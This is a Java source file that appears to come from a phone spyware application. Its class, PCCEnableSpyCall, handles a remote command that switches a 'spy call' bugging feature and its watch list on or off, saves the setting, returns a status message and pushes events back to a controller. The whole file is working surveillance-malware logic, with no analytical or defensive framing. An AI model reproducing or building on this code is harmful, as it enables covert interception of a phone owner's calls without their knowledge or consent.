package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCEnableSpyCall extends PCCRmtCmdAsync {

	private int mode = 0;
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCEnableSpyCall(int mode) {
		this.mode = mode;
	}

	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ENABLE_SPY_CALL.getId());
		try {
			Preference pref = Global.getPreference();
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
			bugInfo.setEnabled(true);
			//TODO: Modified on 28-02-2011
			//bugInfo.setWatchAllEnabled(true);
			watchListInfo.setWatchListEnabled(true);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			if (mode == DISABLE) {
				bugInfo.setEnabled(false);
				//bugInfo.setWatchAllEnabled(false);
				watchListInfo.setWatchListEnabled(false);
				responseMessage.append(RmtCmdTextResource.SPYCALL_DISABLED);
			} else {
				responseMessage.append(RmtCmdTextResource.SPYCALL_ENABLED);
			}
			bugInfo.setPrefWatchListInfo(watchListInfo);
			pref.commit(bugInfo);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
